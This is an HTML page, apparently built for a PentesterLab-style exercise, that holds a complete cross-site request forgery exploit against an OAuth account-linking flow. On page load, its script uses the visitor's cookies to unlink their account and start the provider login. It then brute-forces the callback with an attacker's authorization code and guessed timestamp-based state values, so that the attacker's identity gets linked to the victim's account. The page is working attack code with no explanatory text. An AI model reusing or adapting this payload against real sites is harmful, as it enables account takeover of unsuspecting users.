<!DOCTYPE html>
<html>
  <head>
  </head>
  <body>
<script>


(async ()=>{
    var client_url = "http://ptl-70a53532-e23265ca.libcurl.so"
    var code = "16142cd4d2f54008d913b39b7ae2e362cfc6b42896480a8895dd84afe523ee93"
    var state = "2021080823"
    var utc_m= "45"
    
    function zeroPad(num, size) {
        num = num.toString();
        while (num.length < size) num = "0" + num;
        return num;
    }


    try {
        await fetch(client_url+"/unlink", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }

    try {
        await fetch(client_url+"/users/auth/myprovider", {
            credentials: 'include'
        })
    }
    catch(e) {
        console.log("BB"+e);
    }
    for (let m=utc_m; m<utc_m+2; m++)
    {
        for (let s=0;s<60;s++) {
            try {
                await fetch(client_url+"/users/auth/myprovider/callback?code="+code+"&state="+state+zeroPad(m,2)+zeroPad(s,2), {
                    credentials: 'include'
                })
            }
            catch(e) {
                console.log("BB"+e);
            }
        }
    }
})();
</script>
  </body>
</html>
